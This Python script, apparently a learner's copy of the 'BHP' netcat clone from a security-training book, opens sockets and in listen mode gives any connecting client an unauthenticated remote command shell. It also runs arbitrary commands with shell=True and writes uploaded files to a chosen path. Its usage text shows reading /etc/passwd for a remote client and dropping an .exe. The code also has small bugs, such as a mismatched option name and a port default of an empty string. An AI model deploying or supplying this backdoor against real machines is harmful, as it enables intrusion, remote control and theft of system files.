import sys
import socket
import getopt #for programme understand command-line options
import threading
import subprocess

#define some global variables
listen              = False
command             = False
upload              = False
execute             = ""
target              = ""
upload_destination  = ""
port                = ""

def usage():
    print("NET Net Tool")
    print("")
    print("Usage: netcat.py -t target host -p port ")
    print("-l --listen   -listen on [host]:[port] for incoming connections")
    print("-e --exexute=file_to_run - execute the given file upon receiving a connection")
    print("-c --comand           -initialize a command shell")
    print("-u --upload=destination  -upon receiving connection uplaod a file and write to [destination]")
    print("")
    print("")
    print("Examples:")
    print ("bhpnet.py -t 192.168.0.1 -p 5555 -l -c")
    print ("bhpnet.py -t 192.168.0.1 -p 5555 -l -u=c:\\target.exe")
    print ("bhpnet.py -t 192.168.0.1 -p 5555 -l -e=\"cat /etc/passwd\"")
    print ("echo 'ABCDEFGHI' | ./bhpnet.py -t 192.168.11.12 -p 135")
    sys.exit(0)
def client_sender(buffer):

    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
         #connect to our target host 
         client.connect((target,port))

         if len(buffer):
              client.send(buffer.encode())
         while True:

              #now wait for data back
              recv_len = 1
              response = b""

              while recv_len:
                   data = client.recv(4096)
                   recv_len =len(data)
                   response += data

                   if recv_len < 4096:
                        break
              print(response.decode())

              #wait for more input 
              buffer = input("")
              buffer += "\n"

              #send it off
              client.send(buffer.encode())
    except Exception as e:
         print("[*] Exception ! Exiting.")
         print(e)
    finally:
         #tear down the connection 
         client.close()
def server_loop():
     global target

     #if no arget is defined, we listen on all interfaces
     if not  len(target):
        target = "0.0.0.0"

     server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     server.bind((target,port))

     server.listen(5)

     while True:
          client_socket, addr = server.accept()

          # spin off a threadto handle our new client
          client_thread = threading.Thread(target=client_handler,
                                           args=(client_socket,))
          client_thread.start()

def run_command(command):
     #trim the newline
     command = command.rstrip()

     #run the command and get the output back
     try: 
          output = subprocess.check_output(command, stderr=subprocess.STDOUT, shell=True)
     except:
        output = b"failed to execute command. \r\n"
    # send the output back the client 
     return output 
def client_handler(client_socket):
    global upload
    global execute
    global command

    # Check for upload
    if len(upload_destination):
        # Read all bytes and write them to our destination
        file_buffer = b""

        while True:
            data = client_socket.recv(1024)

            if not data:
                break

            file_buffer += data

        # Write the received bytes to the destination
        try:
            with open(upload_destination, "wb") as file_descriptor:
                file_descriptor.write(file_buffer)

            # Acknowledge that we wrote the file
            client_socket.send(
                f"Successfully saved file to {upload_destination}\r\n".encode()
            )

        except Exception:
            client_socket.send(
                f"Failed to save file to {upload_destination}\r\n".encode()
            )

    # Check for command execution
    if len(execute):

        # Run the command
        output = run_command(execute)

        client_socket.send(output)

    # Go into another loop if a command shell was requested
    if command:

        while True:
            # Show a simple prompt
            client_socket.send(b"<BHP:#> ")

            # Receive data until we see a newline
            cmd_buffer = b""

            while b"\n" not in cmd_buffer:
                data = client_socket.recv(1024)

                if not data:
                    return

                cmd_buffer += data

            # Run the command
            response = run_command(cmd_buffer.decode())

            # Send the response
            client_socket.send(response)
def main():
    global listen 
    global port 
    global execute
    global command
    global upload_destination
    global target

    if not len(sys.argv[1:]):
        usage()

    #read the commandline options
    try:
        opts, args = getopt.getopt(sys.argv[1:], "hle:t:p:cu:", 
                            ["help","listen","execute=","target=","port=","command","upload="])
    except getopt.GetoptError as err:
        print(str(err))
        usage()

    for o,a in opts:
        if o in ("-h","--help"):
            usage()
        elif o in ("-l","--listen"):
            listen = True
        elif o in ("-e", "--execute"):
            execute = a
        elif o in ("-c" , "--commandshell"):
            command = True
        elif o in ("-u", "--upload"):
            upload_destination = a
        elif o in ("-t", "--target"):
            target = a
        elif o in ("-p", "--port"):
            port = int(a)
        else:
            assert False, "unhandled option"

    # are we going to listen or just send data from stdin?
    if not listen and len(target) and port > 0: 
                # read in the buffer from the commandline
                # this will block, so send CTRL-D if not sending input
                # to stdin
                buffer = sys.stdin.read()
                # send data off
                client_sender(buffer)   
    # we are going to listen and potentially 
    # upload things, execute commands, and drop a shell back
    # depending on our command line options above
    if listen:
                server_loop() 


if __name__ == "__main__":
    main()